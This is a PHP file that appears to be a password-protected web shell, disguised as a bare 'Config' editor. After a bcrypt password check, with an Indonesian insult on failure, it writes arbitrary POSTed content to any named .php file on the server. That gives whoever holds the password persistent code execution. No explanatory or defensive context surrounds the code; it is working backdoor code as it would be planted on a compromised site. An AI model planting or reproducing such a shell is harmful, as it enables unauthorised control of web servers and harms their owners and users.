<?php
ini_set('session.gc_maxlifetime', 86400);
session_set_cookie_params(86400);

session_start();

$hashed_password = '$2b$12$tpumex1eLs.8Jr44/UH2geFuQBPddqW8PA.zaPkB7RgjPhnldk036';

if (isset($_GET['logout'])) {
    session_unset();
    session_destroy();
    header("Location: ?");
    exit;
}

if (!isset($_SESSION['plaga_auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $hashed_password)) {
            $_SESSION['plaga_auth'] = true;
            header("Location: ?");
            exit;
        }
        die("Password salah bego");
    }
    ?>
    <form method="post">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>
    <?php
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['name']) && isset($_POST['body'])) {
    $n = basename($_POST['name']);
    $v = $_POST['body'];
    file_put_contents($n, $v);
    echo "<div style='font-family:sans-serif;font-size:14px;color:#444;'>$n updated.</div>";
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        body { font-family: sans-serif; margin: 40px; }
        input[type="text"] { padding: 6px; width: 240px; font-size: 14px; }
        textarea { width: 100%; height: 300px; margin-top: 10px; font-family: monospace; font-size: 13px; }
        #editor {
            display: none;
            margin-top: 30px;
            padding: 20px;
            background: #f6f6f6;
            border: 1px solid #ccc;
            box-shadow: 0 0 8px #aaa;
        }
        button { font-size: 14px; padding: 6px 12px; }
    </style>
</head>
<body>

<h3>Config</h3>
<form id="startForm" onsubmit="return showEditor();">
    <label>Name:</label><br>
    <input type="text" id="openname" placeholder="home.php" required>
    <button type="submit">Open</button>
</form>

<div id="editor">
    <form method="POST">
        <label>Name:</label><br>
        <input type="text" name="name" id="editname" readonly><br><br>
        <textarea name="body" id="editbody">&lt;?php
// ...
?></textarea><br>
        <button type="submit">S</button>
        <button type="button" onclick="cancelEditor()">N</button>
    </form>
</div>

<script>
function showEditor() {
    const val = document.getElementById('openname').value.trim();
    if (!val.endsWith('.php')) {
        alert("Use .php extension");
        return false;
    }
    document.getElementById('editname').value = val;
    document.getElementById('editor').style.display = 'block';
    return false;
}
function cancelEditor() {
    document.getElementById('editor').style.display = 'none';
}
</script>

</body>
</html>
